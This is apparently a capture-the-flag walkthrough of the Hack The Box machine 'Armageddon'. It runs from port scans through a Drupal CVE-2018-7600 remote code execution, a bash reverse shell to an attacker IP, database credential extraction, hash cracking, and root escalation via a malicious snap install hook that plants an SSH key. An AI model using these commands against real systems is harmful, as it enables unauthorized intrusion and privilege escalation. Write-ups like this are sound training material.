# Scan

```bash
ghost@localhost [11:31:59] [~/Documents/hacking/tj-null-boxes/armageddon] [master]
-> % rustscan -t 2000 -a $IP -- -sC -sV
Open 10.10.10.233:22
Open 10.10.10.233:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82c6bbc7026a93bb7ccbdd9c30937934 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC2xdFP3J4cpINVArODYtbhv+uQNECQHDkzTeWL+4aLgKcJuIoA8dQdVuP2UaLUJ0XtbyuabPEBzJl3IHg3vztFZ8UEcS94KuWP09ghv6fhc7JbFYONVJTYLiEPD8nrS/V2EPEQJ2ubNXcZAR76X9SZqt11JTyQH/s6tPH+m3m/84NUU8PNb/dyhrFpCUmZzzJQ1zCDStLXJnCAOE7EfW2wNm1CBPCXn1wNvO3SKwokCm4GoMKHSM9rNb9FjGLIY0nq+8mt7RTJZ+WLdHsje3AkBk1yooGFF+0TdOj42YK2OtAKDQBWnBm1nqLQsmm/Va9T2bPYLLK5aUd4/578u7h
|   256 3aca9530f312d7ca4505bcc7f116bbfc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE4kP4gQ5Th3eu3vz/kPWwlUCm+6BSM6M3Y43IuYVo3ppmJG+wKiabo/gVYLOwzG7js497Vr7eGIgsjUtbIGUrY=
|   256 7ad4b36879cf628a7d5a61e7060f5f33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9ZlC3EA13xZbzvvdjZRWhnu9clFOUe7irG8kT0oR4A
80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```


# Port 80

Seems like I cannot create an account.

```bash
ghost@localhost [13:24:50] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % feroxbuster -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k

403      GET        8l       22w      207c http://10.10.10.233/.html
301      GET        7l       20w      237c http://10.10.10.233/includes => http://10.10.10.233/includes/
200      GET      156l      407w     7440c http://10.10.10.233/
403      GET        8l       22w      206c http://10.10.10.233/.htm
301      GET        7l       20w      236c http://10.10.10.233/scripts => http://10.10.10.233/scripts/
301      GET        7l       20w      237c http://10.10.10.233/profiles => http://10.10.10.233/profiles/
301      GET        7l       20w      234c http://10.10.10.233/sites => http://10.10.10.233/sites/
301      GET        7l       20w      235c http://10.10.10.233/themes => http://10.10.10.233/themes/
403      GET        8l       22w      211c http://10.10.10.233/.htaccess
403      GET        8l       22w      206c http://10.10.10.233/.htc
403      GET        8l       22w      214c http://10.10.10.233/.html_var_DE
403      GET        8l       22w      211c http://10.10.10.233/.htpasswd
403      GET        8l       22w      208c http://10.10.10.233/.html.
403      GET        8l       22w      212c http://10.10.10.233/.html.html
403      GET        8l       22w      212c http://10.10.10.233/.htpasswds
403      GET        8l       22w      207c http://10.10.10.233/.htm.
403      GET        8l       22w      208c http://10.10.10.233/.htmll
403      GET        8l       22w      211c http://10.10.10.233/.html.old
403      GET        8l       22w      205c http://10.10.10.233/.ht
403      GET        8l       22w      211c http://10.10.10.233/.html.bak
403      GET        8l       22w      210c http://10.10.10.233/.htm.htm
200      GET        6l       19w      174c http://10.10.10.233/.gitignore
403      GET        8l       22w      206c http://10.10.10.233/.hta
403      GET        8l       22w      210c http://10.10.10.233/.htgroup
403      GET        8l       22w      208c http://10.10.10.233/.html1
403      GET        8l       22w      211c http://10.10.10.233/.html.LCK
403      GET        8l       22w      217c http://10.10.10.233/.html.printable
403      GET        8l       22w      210c http://10.10.10.233/.htm.LCK
403      GET        8l       22w      211c http://10.10.10.233/.html.php
403      GET        8l       22w      215c http://10.10.10.233/.htaccess.bak
403      GET        8l       22w      208c http://10.10.10.233/.htmls
403      GET        8l       22w      206c http://10.10.10.233/.htx
403      GET        8l       22w      207c http://10.10.10.233/.htm2
403      GET        8l       22w      209c http://10.10.10.233/.htuser
403      GET        8l       22w      207c http://10.10.10.233/.htlm
403      GET        8l       22w      208c http://10.10.10.233/.html-
```

Looking through some files, it seems to be running Drupal, version 7.56.

```bash
ghost@localhost [13:26:10] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % curl http://10.10.10.233/profiles/standard/standard.info
name = Standard
description = Install with commonly used features pre-configured.
version = VERSION
core = 7.x
dependencies[] = block
dependencies[] = color
dependencies[] = comment
dependencies[] = contextual
dependencies[] = dashboard
dependencies[] = help
dependencies[] = image
dependencies[] = list
dependencies[] = menu
dependencies[] = number
dependencies[] = options
dependencies[] = path
dependencies[] = taxonomy
dependencies[] = dblog
dependencies[] = search
dependencies[] = shortcut
dependencies[] = toolbar
dependencies[] = overlay
dependencies[] = field_ui
dependencies[] = file
dependencies[] = rdf

; Information added by Drupal.org packaging script on 2017-06-21
version = "7.56"
project = "drupal"
datestamp = "1498069849"
```

Drupal 7.56 is vulnerable to RCE and found an exploit (https://github.com/pimps/CVE-2018-7600).


# User

Using an exploit above, I got reverse shell.

```bash
ghost@localhost [13:31:22] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "sh -i >& /dev/tcp/10.10.14.3/4444 0>&1"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-J2chWtUnCP0TjgOr-jka8eFR2U6IgvfolpvH3kba9GE
[*] Triggering exploit to execute: sh -i >& /dev/tcp/10.10.14.3/4444 0>&1


ghost@localhost [13:31:22] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.233] 34596
sh: no job control in this shell
sh-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh-4.2$
```

From `/var/www/html/sites/default/settings.php` I found the credential of the database.

```bash
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Apparently, the interactive for `mysql` is broken but I manage to run db by passing queries directly.

```bash
bash-4.2$  mysql -u drupaluser -pCQHEy@9M*m23gBVj drupal -e "SHOW TABLES;"
...
users
....

bash-4.2$ mysql -u drupaluser -pCQHEy@9M*m23gBVj drupal -e "select name, pass, mail from users;"
name    pass    mail

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu

```

Also from `/etc/passwd` the user `brucetherealadmin` exists.

```bash
bash-4.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

I managed to crack the password with `hashcat`. So the credential is `brucetherealadmin:booboo`

```bash
ghost@localhost [13:48:17] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % hashcat admin.hash /usr/share/wordlists/rockyou.txt -O -S -w 3
hashcat (v6.2.6) starting in autodetect mode

...

7900 | Drupal7 | Forums, CMS, E-Commerce

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7900 (Drupal7)
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Tue Nov  1 13:55:54 2022 (3 secs)
Time.Estimated...: Tue Nov  1 13:55:57 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
...

Started: Tue Nov  1 13:55:26 2022
Stopped: Tue Nov  1 13:55:57 2022
```

Using the same credential, I can ssh into `brucetherealadmin`.

```bash
ghost@localhost [13:55:57] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % ssh brucetherealadmin@10.10.10.233
[brucetherealadmin@armageddon ~]$ cat user.txt
53274908aa0e7792d239012ac42862d5
```


# Privilege escalation

From `sudo -l` I can see a few command `brucetherealadmin` can run as sudo.

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

I tried directly executing reverse shell connection and it fails. So instead, I generated a SSH key. 

```bash
ghost@localhost [14:24:43] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % ssh-keygen -f dragon
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in dragon
Your public key has been saved in dragon.pub
The key fingerprint is:
SHA256:6mqLk2eeH7h3sMjiOF9fxLH2NeKj2LNHwurechcCCMY ghost@localhost
The key's randomart image is:
+---[RSA 3072]----+
| .               |
|  E              |
| . . .  .        |
|    . .. o       |
|       oS . o    |
|     ..++ooo .   |
|   oo.o+.++.     |
|..+o*==*+.o.     |
|.++B*BB+==       |
+----[SHA256]-----+
```

Then download it to the target machine under `/home/brucetherealadmin`.

```bash
[brucetherealadmin@armageddon ~]$ curl http://10.10.14.3/dragon.pub -o authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   569  100   569    0     0    743      0 --:--:-- --:--:-- --:--:--   743
```

Then snap is created as fellow. `id` is added behind to knows that the command runs successfully.

```bash
ghost@localhost [14:29:31] [/tmp/tmp.gyeYuwOzq7]
-> % COMMAND="cp /home/brucetherealadmin/authorized_keys /root/.ssh/authorized_keys; id"

ghost@localhost [14:30:39] [/tmp/tmp.gyeYuwOzq7]
-> % cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}
```

Then the package is downloaded to the target machine and runs.

```bash
[brucetherealadmin@armageddon ~]$ curl http://10.10.14.3/xxxx_1.0_all.snap -o pe.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0   6844      0 --:--:-- --:--:-- --:--:--  6860

[brucetherealadmin@armageddon ~]$ sudo snap install pe.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)
[brucetherealadmin@armageddon ~]$
```

Once it runs successfully, I just ssh into the server as root.

```bash
ghost@localhost [14:27:33] [~/Documents/hacking/tj-null-boxes/armageddon] [master *]
-> % ssh root@10.10.10.233 -i dragon
Last login: Tue Mar 23 12:58:10 2021

[root@armageddon ~]# cat root.txt
b65fd602b2682bda017a0a63736995be
```

